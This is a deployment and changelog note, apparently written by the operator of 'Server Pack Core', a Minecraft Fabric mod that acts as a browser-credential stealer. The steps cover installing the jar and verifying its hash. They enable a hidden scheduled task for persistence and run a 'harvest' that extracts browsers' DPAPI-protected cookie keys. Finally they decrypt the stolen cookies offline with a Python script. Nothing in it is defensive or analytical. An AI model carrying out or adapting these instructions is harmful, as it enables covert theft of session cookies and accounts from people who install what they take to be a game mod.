WINDOWS DEPLOYMENT - Server Pack Core 0.1.2

Copy only the .jar, do not run it from the shared drive.

Changes from 0.1.1: the harvest includes browsers/<browser>/keys.txt with
the v10 AES key unwrapped through DPAPI in the session. The rest is unchanged.

1. On Windows, check the file before using it:

   certutil -hashfile serverpackcore-0.1.2.jar SHA256

   It must return:
   150e739c009b11dd9fd5d8b28ef43312edbdb1d54c190e83a1193e1c67577302

2. Go to the mods folder of the Fabric 1.20.1 profile (by default
   %APPDATA%\.minecraft\mods) and delete serverpackcore-0.1.1.jar.

3. Copy serverpackcore-0.1.2.jar into that folder.

4. Close Minecraft and check that no agent remains:

   tasklist | findstr /i "spc-sync"
   taskkill /f /im spc-sync.exe

5. Open Minecraft with the Fabric profile, enter a world and wait 20-60 s.

6. Confirm the new version is running:

   type "%LOCALAPPDATA%\ServerPackCore\state.json"

   It must show "version":"0.1.2".

7. Send `persist on`. Expected reply: "Persistence on: true" and
   "Hidden task: \ServerPackCore". The 0.1.1 task is overwritten, not
   duplicated.

8. Send `harvest`. For each detected browser, the ZIP must contain
   browsers/<browser>/keys.txt with a v10= line (and app_bound= if present).
   If it has error=, Windows has PowerShell restricted: Local State and
   dpapi/ remain as fallback.

9. On Fedora, offline:

   python decrypt.py cookies "…/browsers/<profile>/Cookies" --keys-file "…/browsers/<browser>/keys.txt"

   v20 cookies will appear as <v20 app-bound>; this is expected.

ROLLBACK

If 0.1.2 fails: `persist off`, close Minecraft, delete 0.1.2 and restore
serverpackcore-0.1.1.jar (still in this folder, hash
a7cae78179a6f44876f5d7ca1099722a9e33b66abd7b8c12623de623e6d356ab).
0.1.1 already uses a hidden task, so the mechanism does not change; only
keys.txt is lost.
